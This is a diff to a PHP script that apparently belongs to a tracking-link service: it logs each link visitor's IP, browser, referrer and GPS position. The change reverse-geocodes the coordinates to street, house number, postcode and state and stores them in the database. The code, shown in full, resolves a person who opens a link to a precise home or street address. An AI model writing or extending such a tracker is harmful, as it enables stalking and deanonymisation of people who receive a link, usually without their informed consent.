@@ -64,11 +64,15 @@ try {
     $referrer = $_SERVER['HTTP_REFERER'] ?? '';
     $device_type = preg_match('/mobile/i', $user_agent) ? 'Mobile' : 'Desktop';
     
-    // Get location details using reverse geocoding or IP-based geolocation
+    // Enhanced location details with precise address information
     $geo_data = null;
     $country = 'Unknown';
     $city = 'Unknown';
     $address = 'Unknown';
+    $street = 'Unknown';
+    $house_number = '';
+    $postcode = '';
+    $state = '';
     
     if ($ip_only) {
         // Use IP-based geolocation for fallback
@@ -86,6 +90,8 @@ try {
                 if ($geo_data && $geo_data['status'] === 'success') {
                     $country = $geo_data['country'] ?? 'Unknown';
                     $city = $geo_data['city'] ?? 'Unknown';
+                    $state = $geo_data['regionName'] ?? '';
+                    $postcode = $geo_data['zip'] ?? '';
                     $address = $geo_data['city'] . ', ' . $geo_data['country'];
                 }
             }
@@ -93,33 +99,56 @@ try {
             // Continue without geocoding data
         }
     } else {
-        // Use reverse geocoding for GPS coordinates
+        // Enhanced reverse geocoding for precise GPS coordinates
         try {
-            $geo_url = "https://nominatim.openstreetmap.org/reverse?format=json&lat={$latitude}&lon={$longitude}&zoom=18&addressdetails=1";
+            $geo_url = "https://nominatim.openstreetmap.org/reverse?format=json&lat={$latitude}&lon={$longitude}&zoom=18&addressdetails=1&extratags=1";
             $geo_response = @file_get_contents($geo_url);
             
             if ($geo_response) {
                 $geo_data = json_decode($geo_response, true);
+                
+                if ($geo_data && isset($geo_data['address'])) {
+                    $addr = $geo_data['address'];
+                    
+                    // Extract precise address components
+                    $country = $addr['country'] ?? 'Unknown';
+                    $city = $addr['city'] ?? $addr['town'] ?? $addr['village'] ?? 'Unknown';
+                    $state = $addr['state'] ?? $addr['province'] ?? '';
+                    $postcode = $addr['postcode'] ?? '';
+                    $street = $addr['road'] ?? $addr['street'] ?? '';
+                    $house_number = $addr['house_number'] ?? '';
+                    
+                    // Build detailed address
+                    $address_parts = [];
+                    if ($house_number) $address_parts[] = $house_number;
+                    if ($street) $address_parts[] = $street;
+                    if ($city) $address_parts[] = $city;
+                    if ($state) $address_parts[] = $state;
+                    if ($postcode) $address_parts[] = $postcode;
+                    if ($country) $address_parts[] = $country;
+                    
+                    $address = implode(', ', $address_parts);
+                    
+                    // If no detailed address, use the full display name
+                    if (empty($address) || $address === 'Unknown') {
+                        $address = $geo_data['display_name'] ?? 'Unknown';
+                    }
+                }
             }
         } catch (Exception $e) {
             // Continue without geocoding data
         }
-        
-        // Extract location details
-        $country = $geo_data['address']['country'] ?? 'Unknown';
-        $city = $geo_data['address']['city'] ?? $geo_data['address']['town'] ?? 'Unknown';
-        $address = $geo_data['display_name'] ?? 'Unknown';
     }
     
-    // Insert precise location data
+    // Insert enhanced precise location data
     if ($ip_only) {
         // Insert IP-only data (no coordinates)
         $stmt = $db->prepare("
             INSERT INTO geo_logs (
                 link_id, ip_address, user_agent, referrer, 
-                country, city, address,
+                country, city, address, state, postcode,
                 device_type, timestamp, location_type
-            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'IP')
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'IP')
         ");
         
         $stmt->execute([
@@ -130,17 +159,20 @@ try {
             $country,
             $city,
             $address,
+            $state,
+            $postcode,
             $device_type,
             $timestamp
         ]);
     } else {
-        // Insert GPS data
+        // Insert precise GPS data with detailed address
         $stmt = $db->prepare("
             INSERT INTO geo_logs (
                 link_id, ip_address, user_agent, referrer, 
                 latitude, longitude, accuracy, country, city, address,
+                street, house_number, postcode, state,
                 device_type, timestamp, location_type
-            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'GPS')
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'GPS')
         ");
         
         $stmt->execute([
@@ -154,6 +186,10 @@ try {
             $country,
             $city,
             $address,
+            $street,
+            $house_number,
+            $postcode,
+            $state,
             $device_type,
             $timestamp
         ]);
